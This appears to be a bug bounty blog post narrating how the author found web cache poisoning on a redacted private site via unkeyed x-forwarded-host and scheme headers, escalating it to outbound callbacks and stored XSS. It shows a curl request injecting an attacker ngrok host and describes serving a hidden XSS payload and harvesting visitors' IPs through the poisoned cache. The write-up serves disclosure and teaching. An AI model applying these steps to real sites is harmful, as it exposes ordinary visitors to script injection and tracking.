---
layout: post
published: true
title: Web Cache Poisioing To SSRF and XSS
tags:
    - bug hunting
    - ssrf
    
comments: true

---

# Introduction
I don't waste time by talking about myself ...i gonna share my experience of a bug "web cache poisioning" in bug bounty 
as usually i was pentesting on private sites i saw there my <a href="https://github.com/PortSwigger/param-miner">paraminer</a> shows an unkeyed url
with secret url Before exploiting part i wanna share my thoughts about tha bug called cache poisiong :

**web cache poisiong: This is a technique by which we can poision the whole web page by sending malicious request with unkeyed (that cache ignores) 
headers and urls that leads to defacement,xss,ssrf and other causes** web cache poising is diffrent from web cache poisiong the common thing among
them is cache 

so i was pentesting on private site  saw there an api like 

"https://redacted.net/api/" [it shows all website url's with path]

i send this request to repeater and added an header "x-Forwarded-For : example.com"  i was shocked the url which was used in website [/api endpoint] got replaced by mine
url example.com [due to x-forward header] suddenly i open ngrok and copied the url and added in x-forwarded header and boom  i got incoming request in my terminal with
some private ip of company but that was not high criteria bug so i tried further i addded cachebuster query to the end of url like "https://redacted.net/api?mohit=1234" and 
with the help of curl command it looks like this:

~~~
curl -i -s -k -X $'GET' -H $'Host: redaccted.net' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H 
$'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H 
$'x-forwarded-host: [my ngrok url] -H $'Connection: close' $'https://www.redacted.net?mohit=1234> /dev/null
~~~

it was not working after lot of trying and resarching i added another header "X-Url-Scehme: nohttps" after that i tried so many times cache:miss
but i continouly send request and finally it shows cache: hit means my cache got stored then i visited "https://redacted.net/api?mohit=1234" i saw my incoming request in my
terminal i tried from my phone on another wifi connection i still get incoming connectin means i successfully posiones the web anyone can visit the webpage "https://redacted.net/api?mohit=1234" i grab his ip :P  still i was not satisfied i tried to do xss but failed because of waf :( 

so i tried a diffrented method i created a web page on my website [not mine sad lyf] in which i created 10 raws of json and hide a xss paload in that rows then with the help of
web cache posiong i tried to fetch that webpage and it gotta hit in few attempts and when i visited the ur it shows popup whoo i go xsss ...means ay user that vist on my url got 
popup of "you are hacked run away" another one was defacement but defacinement is shit that's why i leave it and reported xss,sssrf and web cache poisiong :( 

any queries related to article contact on :

facebook : <a href="https://www.facebook.com/mohit20000">mohit</a>

any private programs??

send it on: <a href="mailto:nhibtaungamain@gmail.com">mohit@_@</a>
